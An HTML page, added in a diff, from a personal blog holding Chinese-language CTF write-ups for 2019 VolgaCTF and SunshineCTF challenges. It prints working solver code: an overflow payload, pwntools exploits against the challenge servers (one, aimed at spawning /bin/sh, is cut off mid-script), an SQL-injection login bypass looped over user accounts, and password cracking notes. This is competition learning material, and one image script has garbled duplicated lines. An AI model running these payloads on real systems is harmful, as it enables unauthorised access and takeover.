@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>2019VolgaCTF &amp; 2019SunshineCTF writeup - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="VolgaCTF:  warm/Shadow Cat/JOI  Warm 这道题是 arm 架构下的，不过没什么区别。没有环境的话要先搭一下，直接连服务器做也可以。
+先简单解个密：
+s=&#34;&#34; s&#43;=chr(0x23^85); s&#43;= chr(ord(s[-1])^78) s&#43;= chr(ord(s[-1])^30) s&#43;= chr(ord(s[-1])^21) s&#43;= chr(ord(s[-1])^94) s&#43;= chr(ord(s[-1])^28) s&#43;= chr(ord(s[-1])^33) s&#43;= chr(ord(s[-1])^1) s&#43;= chr(ord(s[-1])^52) s&#43;= chr(ord(s[-1])^7) s&#43;= chr(ord(s[-1])^53) s&#43;= chr(ord(s[-1])^17) s&#43;= chr(ord(s[-1])^55) s&#43;= chr(ord(s[-1])^60) s&#43;= chr(ord(s[-1])^114) s&#43;= chr(ord(s[-1])^71) p.sendline(s); print(len(s)) print(s) 得到 v8&amp;3mqPQebWFqM?x
+程序很明显有溢出，进行覆盖可以读取任意文件，接下来就靠猜了&hellip;
+文件名是 sacred
+payload: v8&amp;3mqPQebWFqM?xpppppppppppppppppppppppppppppppppppppaaaaaaabbbbbxppppppppppppppppppppppppppppppppppsacred
+flag: VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}
+ShadowCat 用 john 进行破解，首先用默认的字典，发现破解速度极慢，破解出来的都是单字符，想想也是&hellip; 所以自己创建一个可打印字符的字典，使用 &ndash;wordlist 设置破解就好了，最后把破解得到的数据与密文对应的字符进行替换，得到
+脚本：
+str = &#34;hajjzvajvzqyaqbendzvajvqauzarlapjzrkybjzenzuvczjvastlj&#34; ans = &#34;&#34; dict = {&#34;z&#34;:&#34;_&#34;,&#34;a&#34;:&#34;a&#34;,&#34;x&#34;:&#34;b&#34;,&#34;q&#34;:&#34;c&#34;,&#34;l&#34;:&#34;w&#34;,&#34;v&#34;:&#34;h&#34;,&#34;e&#34;:&#34;i&#34;,&#34;f&#34;:&#34;j&#34;,&#34;b&#34;:&#34;k&#34;,&#34;r&#34;:&#34;l&#34;,&#34;g&#34;:&#34;m&#34;,&#34;n&#34;:&#34;n&#34;,&#34;o&#34;:&#34;x&#34;,&#34;p&#34;:&#34;y&#34;,&#34;s&#34;:&#34;d&#34;,&#34;c&#34;:&#34;e&#34;,&#34;w&#34;:&#34;f&#34;,&#34;d&#34;:&#34;g&#34;,&#34;t&#34;:&#34;o&#34;,&#34;h&#34;:&#34;p&#34;,&#34;m&#34;:&#34;q&#34;,&#34;k&#34;:&#34;u&#34;,&#34;i&#34;:&#34;v&#34;,&#34;y&#34;:&#34;r&#34;,&#34;j&#34;:&#34;s&#34;,&#34;u&#34;:&#34;t&#34;} for ch in str: ans&#43;=dict[ch]; print(ans) flag: pass_hash_cracking_hashcat_always_lurks_in_the_shadows">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">2019VolgaCTF &amp; 2019SunshineCTF writeup</h1>
+		<div class="post-meta">April 2, 2019</div>
+	</header>
+	<div class="post-content"><h2 id="volgactf">VolgaCTF:</h2>
+<ul>
+<li>warm/Shadow Cat/JOI</li>
+</ul>
+<h3 id="warm">Warm</h3>
+<p>这道题是 arm 架构下的，不过没什么区别。没有环境的话要先搭一下，直接连服务器做也可以。</p>
+<p>先简单解个密：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">s<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+s<span style="color:#f92672">+=</span>chr(<span style="color:#ae81ff">0x23</span><span style="color:#f92672">^</span><span style="color:#ae81ff">85</span>);
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">78</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">30</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">21</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">94</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">28</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">33</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">1</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">52</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">7</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">53</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">17</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">55</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">60</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">114</span>)
+s<span style="color:#f92672">+=</span> chr(ord(s[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">^</span><span style="color:#ae81ff">71</span>)
+p<span style="color:#f92672">.</span>sendline(s);
+
+<span style="color:#66d9ef">print</span>(len(s))
+<span style="color:#66d9ef">print</span>(s)
+</code></pre></div><p>得到 <code>v8&amp;3mqPQebWFqM?x</code></p>
+<p>程序很明显有溢出，进行覆盖可以读取任意文件，接下来就靠猜了&hellip;</p>
+<p>文件名是 <code>sacred</code></p>
+<p>payload: <code>v8&amp;3mqPQebWFqM?xpppppppppppppppppppppppppppppppppppppaaaaaaabbbbbxppppppppppppppppppppppppppppppppppsacred</code></p>
+<p>flag: <code>VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}</code></p>
+<h2 id="shadowcat">ShadowCat</h2>
+<p>用 john 进行破解，首先用默认的字典，发现破解速度极慢，破解出来的都是单字符，想想也是&hellip; 所以自己创建一个可打印字符的字典，使用 &ndash;wordlist 设置破解就好了，最后把破解得到的数据与密文对应的字符进行替换，得到</p>
+<p>脚本：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hajjzvajvzqyaqbendzvajvqauzarlapjzrkybjzenzuvczjvastlj&#34;</span>
+ans <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+dict <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;z&#34;</span>:<span style="color:#e6db74">&#34;_&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#e6db74">&#34;x&#34;</span>:<span style="color:#e6db74">&#34;b&#34;</span>,<span style="color:#e6db74">&#34;q&#34;</span>:<span style="color:#e6db74">&#34;c&#34;</span>,<span style="color:#e6db74">&#34;l&#34;</span>:<span style="color:#e6db74">&#34;w&#34;</span>,<span style="color:#e6db74">&#34;v&#34;</span>:<span style="color:#e6db74">&#34;h&#34;</span>,<span style="color:#e6db74">&#34;e&#34;</span>:<span style="color:#e6db74">&#34;i&#34;</span>,<span style="color:#e6db74">&#34;f&#34;</span>:<span style="color:#e6db74">&#34;j&#34;</span>,<span style="color:#e6db74">&#34;b&#34;</span>:<span style="color:#e6db74">&#34;k&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>:<span style="color:#e6db74">&#34;l&#34;</span>,<span style="color:#e6db74">&#34;g&#34;</span>:<span style="color:#e6db74">&#34;m&#34;</span>,<span style="color:#e6db74">&#34;n&#34;</span>:<span style="color:#e6db74">&#34;n&#34;</span>,<span style="color:#e6db74">&#34;o&#34;</span>:<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;p&#34;</span>:<span style="color:#e6db74">&#34;y&#34;</span>,<span style="color:#e6db74">&#34;s&#34;</span>:<span style="color:#e6db74">&#34;d&#34;</span>,<span style="color:#e6db74">&#34;c&#34;</span>:<span style="color:#e6db74">&#34;e&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>:<span style="color:#e6db74">&#34;f&#34;</span>,<span style="color:#e6db74">&#34;d&#34;</span>:<span style="color:#e6db74">&#34;g&#34;</span>,<span style="color:#e6db74">&#34;t&#34;</span>:<span style="color:#e6db74">&#34;o&#34;</span>,<span style="color:#e6db74">&#34;h&#34;</span>:<span style="color:#e6db74">&#34;p&#34;</span>,<span style="color:#e6db74">&#34;m&#34;</span>:<span style="color:#e6db74">&#34;q&#34;</span>,<span style="color:#e6db74">&#34;k&#34;</span>:<span style="color:#e6db74">&#34;u&#34;</span>,<span style="color:#e6db74">&#34;i&#34;</span>:<span style="color:#e6db74">&#34;v&#34;</span>,<span style="color:#e6db74">&#34;y&#34;</span>:<span style="color:#e6db74">&#34;r&#34;</span>,<span style="color:#e6db74">&#34;j&#34;</span>:<span style="color:#e6db74">&#34;s&#34;</span>,<span style="color:#e6db74">&#34;u&#34;</span>:<span style="color:#e6db74">&#34;t&#34;</span>}
+
+<span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> str:
+  ans<span style="color:#f92672">+=</span>dict[ch];
+
+<span style="color:#66d9ef">print</span>(ans)
+</code></pre></div><p>flag: <code>pass_hash_cracking_hashcat_always_lurks_in_the_shadows</code></p>
+<h2 id="joi">JOI</h2>
+<p>扫描二维码，发现一串公式，一开始尝试能否分离多张图片，无果，仔细分析公式，发现 C_F 就是由 C 和 F 计算得到的。分析能否在只有 C_F 的情况下推出 F，如果 F 的像素值都是0，1是可以的。结果应该是一张二维码。C_F每个位的像素值转为7进制。那么第0位对应 C 的第 0 位。第一位对应 F 的值，剩下的位数和C对应。</p>
+<p>脚本如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+width <span style="color:#f92672">=</span> heigght <span style="color:#f92672">=</span> <span style="color:#ae81ff">530</span>
+img<span style="color:#f92672">=</span>Image<span style="color:#f92672">.</span>img<span style="color:#f92672">=</span>Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;result.png&#34;</span>)
+img_array<span style="color:#f92672">=</span>img<span style="color:#f92672">.</span>load()(<span style="color:#e6db74">&#34;result.png&#34;</span>)
+img_array<span style="color:#f92672">=</span>img<span style="color:#f92672">.</span>load()
+img<span style="color:#f92672">=</span>[]
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">530</span>):
+    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">530</span>):
+        <span style="color:#66d9ef">print</span>((img_array[x,y][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">%</span><span style="color:#ae81ff">14</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">7</span>)
+        img<span style="color:#f92672">.</span>append((img_array[x,y][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">%</span><span style="color:#ae81ff">14</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">7</span>)
+        im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;RGB&#39;</span>,(<span style="color:#ae81ff">530</span>,<span style="color:#ae81ff">530</span>))
+        
+f <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>load()
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(img)):
+    <span style="color:#66d9ef">if</span> img[x] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+        f[x<span style="color:#f92672">/</span><span style="color:#ae81ff">530</span>,x<span style="color:#f92672">%</span><span style="color:#ae81ff">530</span>]<span style="color:#f92672">=</span>(<span style="color:#ae81ff">255</span>,<span style="color:#ae81ff">255</span>,<span style="color:#ae81ff">255</span>)
+    <span style="color:#66d9ef">else</span>:
+        f[x<span style="color:#f92672">/</span><span style="color:#ae81ff">530</span>,x<span style="color:#f92672">%</span><span style="color:#ae81ff">530</span>]<span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)
+im<span style="color:#f92672">.</span>show()
+im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;1.png&#39;</span>)
+</code></pre></div><p>最终 flag: <code>VolgaCTF{5t3g0_m4tr3shk4_in_4cti0n}</code></p>
+<h2 id="sunshinectf">SunshineCTF</h2>
+<ul>
+<li><a href="https://2019.sunshinectf.org/challenges#Patches'%20Punches">Patches' Punches</a>/<a href="https://2019.sunshinectf.org/challenges#Return%20To%20Mania">Return To Mania</a>/<a href="https://2019.sunshinectf.org/challenges#Smash">Smash</a>/<a href="https://2019.sunshinectf.org/challenges#WrestlerBook">WrestlerBook</a>/CyberRumble(赛后)</li>
+</ul>
+<h3 id="patches-puncheshttps2019sunshinectforgchallengespatches2720punches"><a href="https://2019.sunshinectf.org/challenges#Patches%27%20Punches">Patches' Punches</a></h3>
+<p>首先查看程序控制流图，根据题目名称直接 path, jnz 改为 jz，运行一下就能看到 flag 了</p>
+<p>flag:<code>sun{To0HotToHanDleTo0C0ldToH0ld!}</code></p>
+<h3 id="return-to-maniahttps2019sunshinectforgchallengesreturn20to20mania"><a href="https://2019.sunshinectf.org/challenges#Return%20To%20Mania">Return To Mania</a></h3>
+<p>根据题目名称，控制程序流执行 mania 函数</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
+target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000065D</span>
+
+<span style="color:#75715e">#sh = process(&#34;./return-to-mania&#34;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;ret.sunshinectf.org&#34;</span>,<span style="color:#ae81ff">4301</span>)
+data <span style="color:#f92672">=</span> sh<span style="color:#f92672">.</span>recvline()
+data <span style="color:#f92672">=</span> sh<span style="color:#f92672">.</span>recvline()
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;recivedata:&#34;</span><span style="color:#f92672">+</span>data)
+welcome_addr <span style="color:#f92672">=</span> int(data[<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
+
+<span style="color:#75715e">#gdb.attach(sh)</span>
+<span style="color:#66d9ef">print</span>(hex(welcome_addr))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;basic addr:&#34;</span><span style="color:#f92672">+</span>hex(welcome_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x000006ED</span>))
+<span style="color:#75715e">#target_addr = target+welcome_addr-0x00006ED</span>
+target_addr <span style="color:#f92672">=</span> target<span style="color:#f92672">+</span>welcome_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x00006ED</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;target_addr: &#34;</span><span style="color:#f92672">+</span>hex(target_addr))
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">22</span>) <span style="color:#f92672">+</span> p32(target_addr))	
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>flag: <code>sun{0V3rfl0w_rUn_w!Ld_br0th3r}</code></p>
+<h3 id="smashhttps2019sunshinectforgchallengessmash"><a href="https://2019.sunshinectf.org/challenges#Smash">Smash</a></h3>
+<p>逆向推一下，有些函数是没用的</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">arr <span style="color:#f92672">=</span>[<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">31</span>)]
+arr[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+arr[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
+arr[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+arr[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+arr[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+arr[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+arr[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+arr[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
+arr[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
+arr[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+arr[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+arr[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+arr[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
+arr[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">22</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+arr[<span style="color:#ae81ff">23</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+arr[<span style="color:#ae81ff">24</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
+arr[<span style="color:#ae81ff">25</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+arr[<span style="color:#ae81ff">26</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+arr[<span style="color:#ae81ff">27</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
+arr[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
+arr[<span style="color:#ae81ff">29</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
+arr[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(arr)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+  arr[i] <span style="color:#f92672">=</span> arr[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
+<span style="color:#66d9ef">print</span>(arr)
+
+lenArr <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>;
+res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x00000E60</span>, <span style="color:#ae81ff">0x000003A8</span>, <span style="color:#ae81ff">0x00001B80</span>, <span style="color:#ae81ff">0x00000F60</span>, <span style="color:#ae81ff">0x00000120</span>, <span style="color:#ae81ff">0x00000EA0</span>, <span style="color:#ae81ff">0x00000188</span>, <span style="color:#ae81ff">0x00000358</span>, <span style="color:#ae81ff">0x000001A0</span>, <span style="color:#ae81ff">0x000009A0</span>, <span style="color:#ae81ff">0x00000184</span>, <span style="color:#ae81ff">0x000004E0</span>, <span style="color:#ae81ff">0x00000C40</span>, <span style="color:#ae81ff">0x00000C20</span>, <span style="color:#ae81ff">0x000005A0</span>, <span style="color:#ae81ff">0x000001C8</span>, <span style="color:#ae81ff">0x000001D4</span>, <span style="color:#ae81ff">0x000009C0</span>, <span style="color:#ae81ff">0x000001CC</span>, <span style="color:#ae81ff">0x00000B40</span>, <span style="color:#ae81ff">0x00000AE0</span>, <span style="color:#ae81ff">0x00000062</span>, <span style="color:#ae81ff">0x00000360</span>, <span style="color:#ae81ff">0x00000340</span>, <span style="color:#ae81ff">0x000005A0</span>, <span style="color:#ae81ff">0x00000180</span>, <span style="color:#ae81ff">0x000006E0</span>, <span style="color:#ae81ff">0x00000B40</span>, <span style="color:#ae81ff">0x00001540</span>, <span style="color:#ae81ff">0x00000FA0</span>]
+flag <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(res)):
+  flag<span style="color:#f92672">+=</span>chr(res[i]<span style="color:#f92672">&gt;&gt;</span>arr[i])
+
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>flag:<code>sun{Hu1k4MaN1a-ruNs-W1l4-0n-U} </code></p>
+<h3 id="wrestlerbookhttps2019sunshinectforgchallengeswrestlerbook"><a href="https://2019.sunshinectf.org/challenges#WrestlerBook">WrestlerBook</a></h3>
+<p>SQL 注入，熟悉的登录POST表单，sqlmap 一把梭(???) 跑出表名和一些 user*，但是没有密码。我们可以利用</p>
+<p><code>' AND 1=1 /*</code> 绕过密码，用户有两百多个，遍历访问查看哪个有 flag 就好</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://bk.sunshinectf.org/login.php&#34;</span>
+
+headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;___rl__test__cookies=1554029505487; OUTFOX_SEARCH_USER_ID_NCOO=1533311957.0976644&#39;</span>}
+<span style="color:#75715e"># cookie = &#34;&#34;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">250</span>):
+  username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39; AND 1=1 /*&#34;</span>
+  password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span>
+  data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;username&#39;</span>:username,<span style="color:#e6db74">&#39;password&#39;</span>:password}
+  response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data,headers<span style="color:#f92672">=</span>headers)
+  bf <span style="color:#f92672">=</span> BeautifulSoup(response<span style="color:#f92672">.</span>text)
+  texts <span style="color:#f92672">=</span> bf<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;div&#39;</span>, class_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;desc&#39;</span>)
+  <span style="color:#66d9ef">print</span>(texts)
+</code></pre></div><p>flag: <code>sun{ju57_4n07h3r_5ql1_ch4ll}</code></p>
+<h3 id="cyberrumble">CyberRumble</h3>
+<p>这道题每个功能都有一些可以利用的点，&ldquo;tombstone_piledriver &quot; 读文件，可以查看 /proc/self/map 获取程序基址（没什么用）&ldquo;old_school &quot; 忘内存写任意内容（关键），&ldquo;last_ride &quot;  执行system() (关键)，&ldquo;chokeslam &quot; 往输入缓冲区写东西，在后面使用其他功能的时候，只要没有新的数据覆盖，这些数据仍然存在的。根据程序里面的 TODO 也能知道一些。</p>
+<p>关键在于 <code>memcpy(&amp;dest, a1, 0x14uLL);</code></p>
+<p><del>根据题意，想到的 chain 就是 &ldquo;old_school &ldquo;-&gt;&ldquo;old_school &ldquo;-&gt;&ldquo;last_ride  “，第一次写入 “/bin/sh&rdquo; 得到第一个地址，第二次写入第一次的地址，第三次把第二次的传给&quot;last_ride  “，从而构造 system(”/bin/sh&rdquo;)</del></p>
+<p>(只用 mmap 一次然后传值就好了)</p>
+<p>实际操作还是很多问题的，注意退出&quot;old_school &ldquo;的时候不要选 “n&rdquo;，其他随便字符都可以，&ldquo;old_school &ldquo;有\x00截断，第一次返回的地址有前导'\x00'，可以对地址进行 +x 的操作，其次 &ldquo;last_ride  “ 中会多拷贝地址后的 &ldquo;00&rdquo; 导致执行 system 执行时不能访问对应的内存。把产生的地址传给它，成功 getshell . 注意 \x00 可能会导致传址失败，导致 buffer 里面还是  bin/sh</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
+
+<span style="color:#75715e">#sh = process(&#34;./CyberRumble&#34;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;rumble.sunshinectf.org&#34;</span>, <span style="color:#ae81ff">4300</span>)
+sh<span style="color:#f92672">.</span>recvline()
+sh<span style="color:#f92672">.</span>recvline()
+
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;old_school &#34;</span><span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;sss&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+
